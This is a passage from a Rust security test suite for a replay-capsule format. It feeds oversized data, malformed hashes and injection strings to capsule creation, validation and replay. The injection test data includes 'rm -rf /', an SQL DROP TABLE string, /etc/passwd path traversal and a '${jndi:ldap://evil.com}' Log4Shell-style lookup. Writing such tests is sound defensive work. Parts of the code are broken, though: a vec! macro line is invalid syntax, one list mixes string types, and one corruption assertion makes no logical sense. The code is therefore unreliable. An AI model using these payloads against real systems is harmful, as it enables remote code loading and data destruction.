            // Large size (1MB)
            vec![1; 1_000_000],
            // Very large size (10MB)
            vec![2; 10_000_000],
            // Extremely large size (100MB)
            vec![3; 100_000_000],
            // Pattern data
            (0..1_000_000).map(|i| (i % 256) as u8).collect(),
            // Binary data with potential control characters
            (0..10_000).map(|i| (i % 256) as u8).collect(),
        ];

        for (size_idx, data) in size_attack_scenarios.into_iter().enumerate() {
            let original_size = data.len();

            let large_input = CapsuleInput {
                seq: 1,
                data: data.clone(),
                metadata: BTreeMap::new(),
            };

            let result = create_capsule(&format!("size_test_{}", size_idx), vec![large_input], test_env());

            match result {
                Ok(capsule) => {
                    // If creation succeeds, verify data integrity
                    assert_eq!(capsule.inputs.len(), 1);
                    assert_eq!(capsule.inputs[0].data.len(), original_size);
                    assert_eq!(capsule.inputs[0].data, data);

                    // Test memory usage during various operations
                    let start_time = std::time::Instant::now();

                    // Validation should complete in reasonable time
                    let validation = validate_capsule(&capsule);
                    let validation_time = start_time.elapsed();

                    match validation {
                        Ok(_) => {
                            // Large data should not cause excessive validation time
                            assert!(validation_time.as_secs() < 30, "Validation took too long for size {}: {:?}", original_size, validation_time);

                            // Test serialization with size limits
                            let serialization_start = std::time::Instant::now();
                            let serialized = serde_json::to_string(&capsule);
                            let serialization_time = serialization_start.elapsed();

                            match serialized {
                                Ok(_json_str) => {
                                    // Serialization should complete in reasonable time
                                    assert!(serialization_time.as_secs() < 60, "Serialization took too long for size {}: {:?}", original_size, serialization_time);

                                    // Test deserialization
                                    // Note: Skip for very large sizes to avoid test timeout
                                    if original_size < 10_000_000 {
                                        let deserialization_start = std::time::Instant::now();
                                        let _deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&_json_str);
                                        let deserialization_time = deserialization_start.elapsed();

                                        assert!(deserialization_time.as_secs() < 60, "Deserialization took too long for size {}: {:?}", original_size, deserialization_time);
                                    }
                                }
                                Err(_) => {
                                    // Large data may fail to serialize due to memory limits
                                    assert!(original_size > 1_000_000, "Reasonable sizes should serialize successfully");
                                }
                            }

                            // Test replay with large data (skip for very large sizes)
                            if original_size < 50_000_000 {
                                let replay_start = std::time::Instant::now();
                                let replay_result = replay_and_verify(&capsule);
                                let replay_time = replay_start.elapsed();

                                match replay_result {
                                    Ok(_) => {
                                        // Replay should complete in reasonable time
                                        assert!(replay_time.as_secs() < 120, "Replay took too long for size {}: {:?}", original_size, replay_time);
                                    }
                                    Err(_) => {
                                        // Large data may cause replay failures due to resource limits
                                    }
                                }
                            }
                        }
                        Err(_) => {
                            // Large data may be rejected during validation
                            assert!(original_size > 10_000_000, "Reasonable sizes should pass validation");
                        }
                    }
                }
                Err(_) => {
                    // Very large data may be rejected during creation
                    assert!(original_size > 50_000_000, "Reasonable sizes should create successfully");
                }
            }
        }

        // Test multiple large inputs (memory pressure multiplication)
        let multi_input_sizes = vec![
            vec![vec![0; 100_000], vec![1; 100_000]],                    // Two 100KB inputs
            vec![vec![0; 500_000], vec![1; 500_000], vec![2; 500_000]], // Three 500KB inputs
            (0..100).map(|i| vec![i as u8; 10_000]).collect(),          // 100 small inputs
            (0..10).map(|i| vec![i as u8; 1_000_000]).collect(),        // 10 large inputs
        ];

        for (multi_idx, input_data_list) in multi_input_sizes.into_iter().enumerate() {
            let total_size: usize = input_data_list.iter().map(|data| data.len()).sum();

            let inputs: Vec<CapsuleInput> = input_data_list
                .into_iter()
                .enumerate()
                .map(|(seq, data)| CapsuleInput {
                    seq: seq as u64 + 1,
                    data,
                    metadata: BTreeMap::new(),
                })
                .collect();

            let result = create_capsule(&format!("multi_size_test_{}", multi_idx), inputs, test_env());

            match result {
                Ok(capsule) => {
                    // Should handle multiple large inputs gracefully
                    let actual_total: usize = capsule.inputs.iter().map(|input| input.data.len()).sum();
                    assert_eq!(actual_total, total_size);

                    // Test that operations remain efficient with multiple large inputs
                    let start_time = std::time::Instant::now();
                    let _validation = validate_capsule(&capsule);
                    let validation_time = start_time.elapsed();

                    // Should not cause excessive processing time
                    assert!(validation_time.as_secs() < 60, "Multi-input validation took too long for total size {}: {:?}", total_size, validation_time);
                }
                Err(_) => {
                    // Multiple large inputs may exceed memory limits
                    assert!(total_size > 10_000_000, "Reasonable total sizes should succeed");
                }
            }
        }
    }

    #[test]
    fn negative_output_hash_manipulation_and_cryptographic_attacks() {
        // Test output hash manipulation and cryptographic attack resistance
        let hash_attack_scenarios = vec![
            // Valid hash format
            "a".repeat(64),
            // Valid hex lowercase
            "deadbeef".repeat(8),
            // Valid hex uppercase
            "DEADBEEF".repeat(8),
            // Mixed case
            "DeAdBeEf".repeat(8),
            // Too short
            "a".repeat(32),
            // Too long
            "a".repeat(128),
            // Invalid hex characters
            "ghijklmn".repeat(8),
            // Non-hex characters
            "zzzzzzzz".repeat(8),
            // Empty hash
            "".to_string(),
            // Binary data as string
            String::from_utf8(vec![0xFF, 0xFE, 0xFD, 0xFC; 16]).unwrap_or("fallback".to_string()),
            // Unicode in hash
            "控制字符abc123".repeat(4),
            // Null bytes
            format!("{}{}{}",
                "abc123".repeat(5),
                "\x00\x01\x02",
                "def456".repeat(5)
            ),
            // Path traversal attempt in hash
            format!("{}/../../../etc/passwd", "a".repeat(32)),
            // SQL injection style
            format!("{}'; DROP TABLE hashes; --", "a".repeat(32)),
            // Command injection style
            format!("{}; rm -rf /", "a".repeat(32)),
            // Hash collision attempt patterns
            "0000000000000000000000000000000000000000000000000000000000000000",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            // Known weak hash patterns
            "1234567890abcdef".repeat(4),
            // Repeating patterns
            "abcd".repeat(16),
        ];

        for (hash_idx, malicious_hash) in hash_attack_scenarios.into_iter().enumerate() {
            let test_input = CapsuleInput {
                seq: 1,
                data: format!("hash_attack_test_{}", hash_idx).as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            };

            // Create capsule first with valid hash, then manipulate
            let mut capsule = create_capsule(&format!("hash_test_{}", hash_idx), vec![test_input], test_env())
                .expect("base capsule should create");

            // Manipulate the output hash
            if !capsule.expected_outputs.is_empty() {
                capsule.expected_outputs[0].output_hash = malicious_hash.clone();
            } else {
                capsule.expected_outputs.push(CapsuleOutput {
                    seq: 1,
                    data: format!("manipulated_output_{}", hash_idx).as_bytes().to_vec(),
                    output_hash: malicious_hash.clone(),
                });
            }

            // Test validation with manipulated hash
            let validation = validate_capsule(&capsule);
            match validation {
                Ok(_) => {
                    // If validation passes, hash should be structurally valid
                    let hash = &capsule.expected_outputs[0].output_hash;

                    if !hash.is_empty() {
                        // Non-empty hashes that pass validation should be reasonable
                        // (implementation may choose to accept various hash formats)

                        // Test serialization with potentially malicious hash
                        let serialized = serde_json::to_string(&capsule);
                        match serialized {
                            Ok(json_str) => {
                                // Should serialize without corruption
                                assert!(json_str.contains(&capsule.capsule_id));

                                // Should not contain obvious injection patterns
                                assert!(!json_str.contains("../../../"));
                                assert!(!json_str.contains("DROP TABLE"));
                                assert!(!json_str.contains("rm -rf"));

                                // Should be deserializable
                                let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
                                match deserialized {
                                    Ok(reconstructed) => {
                                        // Hash should be preserved correctly
                                        assert_eq!(reconstructed.expected_outputs[0].output_hash, malicious_hash);
                                    }
                                    Err(_) => {
                                        // Extreme hash content may cause deserialization failure
                                    }
                                }
                            }
                            Err(_) => {
                                // Extreme hash content may cause serialization failure
                            }
                        }

                        // Test replay with manipulated hash
                        let replay_result = replay_and_verify(&capsule);
                        match replay_result {
                            Ok(verified) => {
                                if verified {
                                    // Should only verify if hash actually matches computed output
                                    // (This would indicate the malicious hash accidentally matched)
                                } else {
                                    // Expected result for manipulated hashes
                                }
                            }
                            Err(_) => {
                                // Replay may fail with malformed hashes
                            }
                        }
                    }
                }
                Err(_) => {
                    // Invalid hashes should be rejected during validation
                }
            }
        }

        // Test hash collision resistance by creating many capsules and checking for duplicates
        let mut observed_hashes = std::collections::HashSet::new();

        for collision_test in 0..1000 {
            let test_input = CapsuleInput {
                seq: 1,
                data: format!("collision_test_{}", collision_test).as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            };

            if let Ok(capsule) = create_capsule(&format!("collision_{}", collision_test), vec![test_input], test_env()) {
                if !capsule.expected_outputs.is_empty() {
                    let output_hash = &capsule.expected_outputs[0].output_hash;

                    // Check for accidental hash collisions
                    assert!(!observed_hashes.contains(output_hash),
                           "Hash collision detected: {} appeared multiple times", output_hash);

                    observed_hashes.insert(output_hash.clone());

                    // Hash should be deterministic (same input produces same hash)
                    let test_input_dup = CapsuleInput {
                        seq: 1,
                        data: format!("collision_test_{}", collision_test).as_bytes().to_vec(),
                        metadata: BTreeMap::new(),
                    };

                    if let Ok(capsule_dup) = create_capsule(&format!("collision_dup_{}", collision_test), vec![test_input_dup], test_env()) {
                        if !capsule_dup.expected_outputs.is_empty() {
                            // Same input should produce same hash (deterministic)
                            assert_eq!(capsule_dup.expected_outputs[0].output_hash, *output_hash,
                                     "Hash should be deterministic for identical inputs");
                        }
                    }
                }
            }
        }

        // Test preimage resistance (given a hash, difficult to find input that produces it)
        let target_hashes = vec![
            "0000000000000000000000000000000000000000000000000000000000000000",
            "1111111111111111111111111111111111111111111111111111111111111111",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            "deadbeefcafebabe1234567890abcdef0011223344556677889900aabbccddee",
        ];

        for target_hash in target_hashes {
            let mut found_preimage = false;

            // Try various inputs to see if we can produce the target hash
            for preimage_attempt in 0..1000 {
                let attempt_input = CapsuleInput {
                    seq: 1,
                    data: format!("preimage_attempt_{}", preimage_attempt).as_bytes().to_vec(),
                    metadata: BTreeMap::new(),
                };

                if let Ok(capsule) = create_capsule(&format!("preimage_{}", preimage_attempt), vec![attempt_input], test_env()) {
                    if !capsule.expected_outputs.is_empty() {
                        if capsule.expected_outputs[0].output_hash == target_hash {
                            found_preimage = true;
                            break;
                        }
                    }
                }
            }

            // Should be extremely unlikely to find preimage by chance
            assert!(!found_preimage, "Accidentally found preimage for target hash: {}", target_hash);
        }
    }

    #[test]
    fn negative_concurrent_capsule_operations_and_state_corruption() {
        // Test concurrent capsule operations and state corruption scenarios
        let base_env = test_env();

        // Create multiple capsules that will be operated on concurrently
        let mut test_capsules = Vec::new();
        for concurrent_idx in 0..20 {
            let input = CapsuleInput {
                seq: 1,
                data: format!("concurrent_test_{}", concurrent_idx).as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            };

            if let Ok(capsule) = create_capsule(&format!("concurrent_{}", concurrent_idx), vec![input], base_env.clone()) {
                test_capsules.push(capsule);
            }
        }

        // Simulate concurrent operations on capsules
        let mut validation_results = Vec::new();
        let mut replay_results = Vec::new();
        let mut serialization_results = Vec::new();

        for capsule in &test_capsules {
            // Concurrent validation
            validation_results.push(validate_capsule(capsule));

            // Concurrent replay
            replay_results.push(replay_and_verify(capsule));

            // Concurrent serialization
            serialization_results.push(serde_json::to_string(capsule));

            // Simulate memory pressure during operations
            let _stress_data = vec![0u8; 1_000_000]; // Allocate 1MB per operation
        }

        // Verify all operations completed without corruption
        for (idx, result) in validation_results.into_iter().enumerate() {
            match result {
                Ok(_) => {
                    // Should be consistent with original capsule
                    assert!(!test_capsules[idx].capsule_id.is_empty());
                }
                Err(_) => {
                    // May fail under memory pressure, but should be deterministic
                }
            }
        }

        for (idx, result) in replay_results.into_iter().enumerate() {
            match result {
                Ok(_) => {
                    // Replay should be deterministic
                    let second_replay = replay_and_verify(&test_capsules[idx]);
                    // Should get same result on second replay
                    assert!(second_replay.is_ok() == result.is_ok(),
                           "Replay should be deterministic for capsule {}", idx);
                }
                Err(_) => {
                    // Failures should also be deterministic
                    let second_replay = replay_and_verify(&test_capsules[idx]);
                    assert!(second_replay.is_err(),
                           "Replay failures should be deterministic for capsule {}", idx);
                }
            }
        }

        for (idx, result) in serialization_results.into_iter().enumerate() {
            match result {
                Ok(json_str) => {
                    // Should deserialize to identical capsule
                    let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
                    match deserialized {
                        Ok(reconstructed) => {
                            assert_eq!(reconstructed.capsule_id, test_capsules[idx].capsule_id);
                            assert_eq!(reconstructed.format_version, test_capsules[idx].format_version);
                            assert_eq!(reconstructed.inputs.len(), test_capsules[idx].inputs.len());
                        }
                        Err(_) => {
                            panic!("Serialized capsule {} should deserialize correctly", idx);
                        }
                    }
                }
                Err(_) => {
                    // Serialization failure should be reproducible
                    let second_serialization = serde_json::to_string(&test_capsules[idx]);
                    assert!(second_serialization.is_err(),
                           "Serialization failures should be deterministic for capsule {}", idx);
                }
            }
        }

        // Test rapid capsule creation/destruction cycles
        for cycle in 0..100 {
            let rapid_input = CapsuleInput {
                seq: 1,
                data: format!("rapid_cycle_{}", cycle).as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            };

            let create_result = create_capsule(&format!("rapid_{}", cycle), vec![rapid_input], base_env.clone());

            match create_result {
                Ok(capsule) => {
                    // Immediately validate
                    let _validation = validate_capsule(&capsule);

                    // Immediately replay
                    let _replay = replay_and_verify(&capsule);

                    // Immediately serialize
                    let _serialized = serde_json::to_string(&capsule);

                    // All operations should remain consistent despite rapid cycling
                }
                Err(_) => {
                    // Creation may fail under rapid cycling - acceptable
                }
            }
        }

        // Test state corruption resistance through capsule modification
        if !test_capsules.is_empty() {
            let mut corruption_capsule = test_capsules[0].clone();

            // Modify capsule in various ways to test corruption resistance
            corruption_capsule.capsule_id = format!("corrupted_{}", corruption_capsule.capsule_id);
            corruption_capsule.format_version = corruption_capsule.format_version.wrapping_add(1);

            if !corruption_capsule.inputs.is_empty() {
                corruption_capsule.inputs[0].data.push(0xFF); // Append byte
            }

            if !corruption_capsule.expected_outputs.is_empty() {
                corruption_capsule.expected_outputs[0].output_hash = "corrupted_hash".to_string();
            }

            // Validation should detect corruption
            let corruption_validation = validate_capsule(&corruption_capsule);
            let original_validation = validate_capsule(&test_capsules[0]);

            // Results should be different (corruption detected)
            assert_ne!(corruption_validation.is_ok(), original_validation.is_ok() ||
                      corruption_validation.is_err(), "Corruption should be detectable");

            // Replay should also detect corruption
            let corruption_replay = replay_and_verify(&corruption_capsule);
            let original_replay = replay_and_verify(&test_capsules[0]);

            // Corruption should affect replay results
            match (original_replay, corruption_replay) {
                (Ok(original_verified), Ok(corrupted_verified)) => {
                    // If both succeed, verification results should differ
                    assert_ne!(original_verified, corrupted_verified,
                             "Corruption should be detected during replay verification");
                }
                _ => {
                    // Different error patterns are also acceptable
                }
            }
        }

        // Final integrity check on all test capsules
        for (idx, capsule) in test_capsules.iter().enumerate() {
            // Original capsules should remain uncorrupted
            assert!(!capsule.capsule_id.is_empty(), "Capsule {} ID should not be empty", idx);
            assert_eq!(capsule.format_version, CURRENT_FORMAT_VERSION, "Capsule {} version should be current", idx);
            assert!(!capsule.inputs.is_empty(), "Capsule {} should have inputs", idx);

            // Should still validate correctly
            let final_validation = validate_capsule(capsule);
            assert!(final_validation.is_ok(), "Capsule {} should still validate after concurrent operations", idx);
        }
    }

    #[cfg(test)]
    mod replay_capsule_comprehensive_security_and_boundary_tests {
        use super::*;
        use std::collections::HashMap;
        use crate::security::constant_time;

        #[test]
        fn test_capsule_input_data_injection_and_overflow_attacks() {
            // Attack 1: Massive data payloads to trigger memory exhaustion
            let massive_data = vec![0xFF; usize::MAX.min(100_000_000)];
            let massive_input = CapsuleInput {
                seq: 1,
                data: massive_data.clone(),
                metadata: BTreeMap::new(),
            };

            // Should handle large inputs without crashing
            assert_eq!(massive_input.data.len(), usize::MAX.min(100_000_000));
            assert_eq!(massive_input.seq, 1);

            // Attack 2: Integer overflow in sequence numbers
            let overflow_inputs = vec![
                CapsuleInput { seq: 0, data: vec![1], metadata: BTreeMap::new() },
                CapsuleInput { seq: u64::MAX, data: vec![2], metadata: BTreeMap::new() },
                CapsuleInput { seq: u64::MAX - 1, data: vec![3], metadata: BTreeMap::new() },
                CapsuleInput { seq: 1, data: vec![4], metadata: BTreeMap::new() },
            ];

            for input in &overflow_inputs {
                assert!(input.seq <= u64::MAX, "Sequence number should be within bounds");
                assert!(!input.data.is_empty(), "Input data should not be empty");
            }

            // Attack 3: Metadata injection with malicious keys/values
            let mut malicious_metadata = BTreeMap::new();
            malicious_metadata.insert("\x00\x01null_bytes".to_string(), "value_with_nulls\x00\x01".to_string());
            malicious_metadata.insert("../../etc/passwd".to_string(), "path_traversal_key".to_string());
            malicious_metadata.insert("${jndi:ldap://evil.com}".to_string(), "injection_attempt".to_string());
            malicious_metadata.insert("very_long_key".repeat(1000), "x".repeat(10000));
            malicious_metadata.insert("unicode_🦀_🔒_⚡".to_string(), "emoji_injection".to_string());

            let injection_input = CapsuleInput {
                seq: 42,
                data: vec![0xDE, 0xAD, 0xBE, 0xEF],
                metadata: malicious_metadata.clone(),
            };

            // Should preserve malicious metadata without execution
            assert_eq!(injection_input.metadata.len(), 5);
            assert!(injection_input.metadata.contains_key("\x00\x01null_bytes"));
            assert!(injection_input.metadata.contains_key("../../etc/passwd"));

            // Attack 4: Binary data corruption and format confusion
            let binary_payloads = vec![
                vec![0x00; 1000],                    // All nulls
                vec![0xFF; 1000],                    // All ones
                (0..=255).cycle().take(1000).collect(), // Repeating byte pattern
                vec![0x7F, 0xFF, 0x80, 0x00, 0x01], // Mixed binary data
            ];

            for (i, payload) in binary_payloads.iter().enumerate() {
                let binary_input = CapsuleInput {
                    seq: i as u64,
                    data: payload.clone(),
                    metadata: BTreeMap::new(),
                };

                assert_eq!(binary_input.data, *payload, "Binary payload should be preserved exactly");
                assert!(binary_input.seq < 10, "Sequence should be reasonable");
            }

            // Attack 5: Empty and boundary condition inputs
            let boundary_inputs = vec![
                CapsuleInput { seq: 0, data: vec![], metadata: BTreeMap::new() }, // Empty data
                CapsuleInput { seq: u64::MAX, data: vec![42], metadata: BTreeMap::new() }, // Max sequence
            ];

            for input in boundary_inputs {
                // Should handle empty data gracefully
                assert!(input.data.len() <= 1, "Boundary input should be small or empty");
                assert!(input.seq == 0 || input.seq == u64::MAX, "Should test boundary sequences");
            }
        }

        #[test]
        fn test_capsule_output_hash_collision_and_verification_attacks() {
            // Attack 1: Hash collision attempts using known weak patterns
            let collision_attempts = vec![
                ("", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"), // SHA256 of empty
                ("a", "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb"), // SHA256 of 'a'
                ("abc", "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"), // SHA256 of 'abc'
            ];

            for (i, (data, expected_hash)) in collision_attempts.iter().enumerate() {
                let hash_output = CapsuleOutput {
                    seq: i as u64,
                    data: data.as_bytes().to_vec(),
                    output_hash: expected_hash.to_string(),
                };

                // Verify hash is preserved exactly
                assert_eq!(hash_output.output_hash, *expected_hash);
                assert_eq!(hash_output.data, data.as_bytes());

                // Test actual SHA256 computation matches expected
                let computed_hash = hex::encode(Sha256::digest(&hash_output.data));
                assert_eq!(computed_hash, *expected_hash, "Computed hash should match expected for '{}'", data);
            }

            // Attack 2: Malformed hash strings to test validation
            let malformed_hashes = vec![
                "not_a_valid_hex_hash",
                "deadbeef", // Too short
                "g".repeat(64), // Invalid hex characters
                "A".repeat(63), // One character short
                "B".repeat(65), // One character too long
                "", // Empty hash
                "🦀".repeat(16), // Unicode in hash
            ];

            for (i, malformed_hash) in malformed_hashes.iter().enumerate() {
                let bad_output = CapsuleOutput {
                    seq: i as u64,
                    data: vec![i as u8],
                    output_hash: malformed_hash.clone(),
                };

                // Should preserve malformed hash without crashing
                assert_eq!(bad_output.output_hash, *malformed_hash);
                assert!(!bad_output.data.is_empty() || i == 0);
            }

            // Attack 3: Data/hash mismatch scenarios
            let mismatch_cases = vec![
                (vec![1, 2, 3], "incorrect_hash_for_this_data".to_string()),
                (vec![], "non_empty_hash_for_empty_data".to_string()),
                (vec![0xFF; 1000], "short_hash".to_string()),
            ];

            for (i, (data, bad_hash)) in mismatch_cases.iter().enumerate() {
                let mismatch_output = CapsuleOutput {
                    seq: i as u64,
                    data: data.clone(),
                    output_hash: bad_hash.clone(),
                };

                // Should store mismatched data without automatic correction
                assert_eq!(mismatch_output.data, *data);
                assert_eq!(mismatch_output.output_hash, *bad_hash);
            }

            // Attack 4: Sequence number attacks in outputs
            let sequence_attacks = vec![
                (u64::MAX, vec![1]),     // Maximum sequence
                (0, vec![2]),            // Zero sequence
                (u64::MAX / 2, vec![3]), // Midpoint sequence
            ];

            for (seq, data) in sequence_attacks {
                let seq_output = CapsuleOutput {
                    seq,
                    data: data.clone(),
                    output_hash: hex::encode(Sha256::digest(&data)),
                };

                assert_eq!(seq_output.seq, seq);
                assert_eq!(seq_output.data, data);
            }

            // Attack 5: Binary data in hash field
            let binary_hash_data = vec![0x00, 0x01, 0xFF, 0x7F, 0x80];
            let binary_as_string = String::from_utf8_lossy(&binary_hash_data).to_string();

            let binary_hash_output = CapsuleOutput {
                seq: 999,
                data: vec![42],
                output_hash: binary_as_string.clone(),
            };

            // Should handle binary data in hash field without crashing
            assert_eq!(binary_hash_output.output_hash, binary_as_string);
            assert_eq!(binary_hash_output.seq, 999);
        }

        #[test]
        fn test_environment_snapshot_tampering_and_injection_attacks() {
            // Attack 1: Platform identifier injection attacks
            let malicious_platforms = vec![
                "../../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "linux-x86_64\x00\x01injection",
                "windows\r\ninjected_line",
                "very_long_platform_name_".repeat(100),
                "🦀_platform_with_emoji",
                "",  // Empty platform
            ];

            for (i, platform) in malicious_platforms.iter().enumerate() {
                let malicious_env = EnvironmentSnapshot {
                    runtime_version: format!("v1.{}", i),
                    platform: platform.clone(),
                    config_hash: "test_hash".to_string(),
                    properties: BTreeMap::new(),
                };

                // Should preserve malicious platform strings without execution
                assert_eq!(malicious_env.platform, *platform);
                assert!(!malicious_env.runtime_version.is_empty());
            }

            // Attack 2: Runtime version manipulation
            let version_attacks = vec![
                "1.0.0-../../../etc/passwd".to_string(),
                String::from_utf8_lossy(b"v\x00\x01\xFF\x7F").into_owned(),
                "999999999.999999999.999999999".to_string(),
                "version with spaces and \t\n special chars".to_string(),
                "".to_string(), // Empty version
                "version_".repeat(1000), // Very long version
            ];

            for version in version_attacks {
                let version_env = EnvironmentSnapshot {
                    runtime_version: version.clone(),
                    platform: "linux-x86_64".to_string(),
                    config_hash: "hash123".to_string(),
                    properties: BTreeMap::new(),
                };

                assert_eq!(version_env.runtime_version, version);
                assert!(!version_env.platform.is_empty());
            }

            // Attack 3: Config hash collision and format attacks
            let hash_attacks = vec![
                "not_a_real_hash".to_string(),
                "".to_string(),  // Empty hash
                "0".repeat(1000), // Very long fake hash
                "invalid_hex_chars_ghijk".to_string(),
                "mixed_CASE_Hash_123".to_string(),
                String::from_utf8_lossy(b"\x00\x01binary_in_hash\xFF").into_owned(),
                "hash with spaces".to_string(),
            ];

            for hash_val in hash_attacks {
                let hash_env = EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "test_platform".to_string(),
                    config_hash: hash_val.clone(),
                    properties: BTreeMap::new(),
                };

                assert_eq!(hash_env.config_hash, hash_val);
                assert!(!hash_env.runtime_version.is_empty());
            }

            // Attack 4: Properties injection with malicious key-value pairs
            let mut malicious_properties = BTreeMap::new();
            malicious_properties.insert("normal_key".to_string(), "normal_value".to_string());
            malicious_properties.insert("".to_string(), "empty_key".to_string());
            malicious_properties.insert("key".to_string(), "".to_string());
            malicious_properties.insert("path_traversal".to_string(), "../../etc/passwd".to_string());
            malicious_properties.insert("injection".to_string(), "${jndi:ldap://evil.com}".to_string());
            malicious_properties.insert(
                "\x00null\x01bytes".to_string(),
                String::from_utf8_lossy(b"binary_data\xFF\x7F").into_owned(),
            );
            malicious_properties.insert("unicode_🦀_key".to_string(), "emoji_🔒_value".to_string());
            malicious_properties.insert("very_long_key_".repeat(500), "x".repeat(10000));

            let props_env = EnvironmentSnapshot {
                runtime_version: "v1.0.0".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "abc123".to_string(),
                properties: malicious_properties.clone(),
            };

            // Should preserve all malicious properties without execution
            assert_eq!(props_env.properties.len(), 8);
            assert_eq!(props_env.properties.get("path_traversal").unwrap(), "../../etc/passwd");
            assert_eq!(props_env.properties.get("injection").unwrap(), "${jndi:ldap://evil.com}");

            // Attack 5: Large property collections to stress memory
            let mut large_properties = BTreeMap::new();
            for i in 0..10000 {
                large_properties.insert(format!("key_{}", i), format!("value_{}", i));
            }

            let large_env = EnvironmentSnapshot {
                runtime_version: "v1.0.0".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "hash123".to_string(),
                properties: large_properties,
            };

            assert_eq!(large_env.properties.len(), 10000);
            assert!(large_env.properties.contains_key("key_9999"));
        }

        #[test]
        fn test_replay_capsule_structure_manipulation_and_boundary_attacks() {
            // Attack 1: Format version manipulation
            let version_attacks = vec![
                0,                    // Zero version
                u32::MAX,            // Maximum version
                999999,              // Very high version
                MIN_FORMAT_VERSION.saturating_sub(1), // Below minimum
                CURRENT_FORMAT_VERSION.saturating_add(1000), // Far future version
            ];

            for version in version_attacks {
                let version_capsule = ReplayCapsule {
                    capsule_id: "test_id".to_string(),
                    format_version: version,
                    inputs: vec![CapsuleInput { seq: 1, data: vec![42], metadata: BTreeMap::new() }],
                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![42], output_hash: "hash".to_string() }],
                    environment: EnvironmentSnapshot {
                        runtime_version: "v1.0.0".to_string(),
                        platform: "linux".to_string(),
                        config_hash: "hash123".to_string(),
                        properties: BTreeMap::new(),
                    },
                };

                // Should preserve version without automatic correction
                assert_eq!(version_capsule.format_version, version);
                assert!(!version_capsule.capsule_id.is_empty());
            }

            // Attack 2: Capsule ID injection and format attacks
            let id_attacks = vec![
                "".to_string(),  // Empty ID
                "../../etc/passwd".to_string(),
                "${jndi:ldap://evil.com}".to_string(),
                String::from_utf8_lossy(b"\x00\x01\xFF\x7F").into_owned(), // Binary data
                "very_long_id_".repeat(1000),
                "unicode_🦀_id".to_string(),
                "id with\nlines\rand\ttabs".to_string(),
                "normal_id_123".to_string(),
            ];

            for id in id_attacks {
                let id_capsule = ReplayCapsule {
                    capsule_id: id.clone(),
                    format_version: CURRENT_FORMAT_VERSION,
                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
                    environment: EnvironmentSnapshot {
                        runtime_version: "v1.0.0".to_string(),
                        platform: "linux".to_string(),
                        config_hash: "hash".to_string(),
                        properties: BTreeMap::new(),
                    },
                };

                assert_eq!(id_capsule.capsule_id, id);
                assert_eq!(id_capsule.format_version, CURRENT_FORMAT_VERSION);
            }

            // Attack 3: Input/output sequence misalignment attacks
            let misaligned_inputs = vec![
                CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() },
                CapsuleInput { seq: 3, data: vec![2], metadata: BTreeMap::new() }, // Gap in sequence
                CapsuleInput { seq: 2, data: vec![3], metadata: BTreeMap::new() }, // Out of order
                CapsuleInput { seq: 3, data: vec![4], metadata: BTreeMap::new() }, // Duplicate sequence
            ];

            let misaligned_outputs = vec![
                CapsuleOutput { seq: 5, data: vec![1], output_hash: "h1".to_string() }, // No matching input
                CapsuleOutput { seq: 1, data: vec![2], output_hash: "h2".to_string() },
            ];

            let misaligned_capsule = ReplayCapsule {
                capsule_id: "misaligned".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: misaligned_inputs,
                expected_outputs: misaligned_outputs,
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            // Should preserve misaligned sequences
            assert_eq!(misaligned_capsule.inputs.len(), 4);
            assert_eq!(misaligned_capsule.expected_outputs.len(), 2);
            assert!(misaligned_capsule.inputs.iter().any(|i| i.seq == 3)); // Duplicate seq exists

            // Attack 4: Empty collections boundary testing
            let empty_inputs_capsule = ReplayCapsule {
                capsule_id: "empty_inputs".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![], // Empty inputs
                expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            assert!(empty_inputs_capsule.inputs.is_empty());
            assert!(!empty_inputs_capsule.expected_outputs.is_empty());

            let empty_outputs_capsule = ReplayCapsule {
                capsule_id: "empty_outputs".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
                expected_outputs: vec![], // Empty outputs
                environment: EnvironmentSnapshot {
                    runtime_version: "v1.0.0".to_string(),
                    platform: "linux".to_string(),
                    config_hash: "hash".to_string(),
                    properties: BTreeMap::new(),
                },
            };

            assert!(!empty_outputs_capsule.inputs.is_empty());
            assert!(empty_outputs_capsule.expected_outputs.is_empty());

            // Attack 5: Large collection stress testing
            let large_inputs: Vec<CapsuleInput> = (0..10000).map(|i| {
                CapsuleInput {
                    seq: i,
                    data: vec![i as u8],
                    metadata: BTreeMap::new(),
                }
            }).collect();

            let large_outputs: Vec<CapsuleOutput> = (0..10000).map(|i| {
                CapsuleOutput {
                    seq: i,
                    data: vec![i as u8],
                    output_hash: format!("hash_{}", i),
                }
            }).collect();

            let large_capsule = ReplayCapsule {
                capsule_id: "large_collections".to_string(),
                format_version: CURRENT_FORMAT_VERSION,
                inputs: large_inputs,
